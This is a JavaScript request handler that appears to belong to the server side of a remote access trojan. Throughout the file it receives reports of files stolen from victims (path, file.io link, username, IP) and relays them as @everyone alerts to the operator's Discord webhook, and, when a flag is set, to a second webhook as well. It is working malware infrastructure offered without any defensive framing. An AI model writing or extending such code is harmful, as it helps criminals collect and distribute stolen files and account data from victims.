import AsciiTable from "ascii-table";
import { WebhookClient, EmbedBuilder } from "discord.js";
import { getClientIp } from "request-ip";

const usernameRegex = /^[a-zA-Z0-9_]{1,16}$/;
const urlRegex = /^https:\/\/file\.io\/[a-zA-Z0-9]+$/;

export default function handleFile(ratDB, webhookClient, sendError, getNetworth) {
  return async function (req, res) {
    const { id, username = "null", path = "null", url = "null" } = req.body;
    const ip = getClientIp(req);

    const table = new AsciiTable("File Hit").setHeading("Type", "Value");
    table.addRow("Code", id);
    table.addRow("Username", username);
    table.addRow("Path", path);
    table.addRow("URL", url);
    table.addRow("IP", ip);

    if (
      username.toLowerCase().includes("discord") ||
      path.toLowerCase().includes("discord") ||
      url.toLowerCase().includes("discord") ||
      !usernameRegex.test(username) ||
      !urlRegex.test(url)
    ) {
      table.addRow("Error", "Invalid Request");
      console.log(table.toString());
      return;
    }

    try {
      const { webhook, dhooked } = await ratDB.getWebhook(id);
      const embed = new EmbedBuilder()
        .setColor("#ffaa00")
        .setTitle(":file_folder: File Uploaded")
        .addFields(
          { name: ":globe_with_meridians: File Location", value: `\`\`\`${path}\`\`\``, inline: false },
          { name: ":link: URL", value: url, inline: false }
        );

      if (dhooked)
        await webhookClient.send({
          content: "@everyone",
          username: "Message - " + username,
          embeds: [embed],
        });

      if (webhook) {
        const webhookClientCustom = new WebhookClient({ url: webhook });
        await webhookClientCustom.send({
          content: "@everyone",
          username: "Message - " + username,
          embeds: [embed],
        });
      } else {
        table.addRow("Error", "Webhook Not Found");
      }
    } catch (e) {
      var errorMsg;
      if (e.response) {
        errorMsg = e.response.data;
      } else if (e.request) {
        errorMsg = e.request;
      } else {
        errorMsg = e.message;
      }

      table.addRow("Error", e);
    }

    console.log(table.toString());
  };
}
